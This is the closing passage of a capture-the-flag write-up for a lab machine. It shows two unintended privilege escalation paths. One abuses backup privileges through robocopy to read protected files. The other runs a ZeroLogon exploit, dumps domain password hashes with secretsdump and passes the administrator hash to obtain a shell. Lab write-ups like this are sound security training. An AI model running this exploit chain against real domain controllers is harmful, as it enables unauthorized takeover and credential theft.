C:\Windows\system32>whoami
nt authority\system

```

## Unintended Paths

### Read as SYSTEM

#### Enumeration

I had noted earlier that jorden was in the Server Operators group, and that brings a handful of privileges:

```
*Evil-WinRM* PS C:\Users\jorden\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======                
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled                
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled                
SeTimeZonePrivilege           Change the time zone                Enabled 

```

I’m particularly interesting in backup and restore. I can see that jorden has `SeBackupPrivilege` and `SeRestorePrivilege`.

#### File Read

With both of these privs, I can use `robocopy` to read files (see [PayloadsAllTheThings short reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)).

```
*Evil-WinRM* PS C:\programdata\temp> robocopy /b C:\users\administrator\desktop C:\programdata\temp
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, April 1, 2020 12:48:19 PM
   Source : C:\users\administrator\desktop\
     Dest : C:\programdata\temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
------------------------------------------------------------------------------

                           2    C:\users\administrator\desktop\
            New File                 488        desktop.ini
  0%
100%
            New File                  34        root.txt
  0%
100%
------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         2         0         0         0         0
   Bytes :       522       522         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Wednesday, April 1, 2020 12:48:19 PM
*Evil-WinRM* PS C:\programdata\temp> dir

    Directory: C:\programdata\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/1/2020   2:36 AM             34 root.txt

```

Now that it’s there, I can read the flag:

```
*Evil-WinRM* PS C:\programdata\temp> type root.txt
b292dfe5************************

```

### ZeroLogon

I dropped a [quick post](/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html) earlier this week on CVE-2020-1472. I could have run this without doing anything else on the box, and it works here too:

```

(venv) root@kali# python /opt/CVE-2020-1472/cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
Performing authentication attempts...
======================
Target vulnerable, changing account password to empty string                                    

Result: 0

Exploit complete!

(venv) root@kali# secretsdump.py -no-pass -just-dc MULTIMASTER\$@10.10.10.179
Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                               
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::         
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                              
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::
...[snip]...

```

I can now use the administrator hash to get [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

root@kali# evil-winrm -u administrator -i 10.10.10.179 --hash 69cbf4a9b7415c9e1caf93d51d971be0

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megacorp\administrator

```